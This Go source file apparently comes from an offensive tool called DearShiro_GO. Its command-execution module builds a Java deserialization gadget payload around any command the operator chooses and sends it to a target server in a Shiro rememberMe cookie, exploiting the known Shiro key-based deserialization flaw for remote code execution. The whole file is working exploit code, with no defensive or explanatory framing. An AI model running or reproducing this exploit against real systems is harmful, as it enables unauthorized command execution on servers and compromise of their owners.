package exec

import (
	"DearShiro_GO/core/conn"
	"DearShiro_GO/core/data"
	"DearShiro_GO/core/scanner"
	"fmt"
	"os"
	"strconv"
)

type CommandExecutor struct {
	TargetUrl string
	Key       string
	Gadget    string
}

func (this *CommandExecutor) Exec(command string) {
	payloadMap := data.NewPayloadMap()
	serialData, err := payloadMap.GetPayload(this.Gadget, command)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		scanner.PrintAvailableGadget()
		os.Exit(0)
	}

	connection := conn.NewConnection(this.TargetUrl)
	fmt.Println("[*] Use Key: " + this.Key)
	fmt.Printf("[+] Use Gadget: %s, Execute Command: %s", this.Gadget, command)
	response := connection.SendRememberMe([]byte(this.Key), serialData)
	fmt.Println("[-] Response Code: " + strconv.Itoa(response.StatusCode))
}
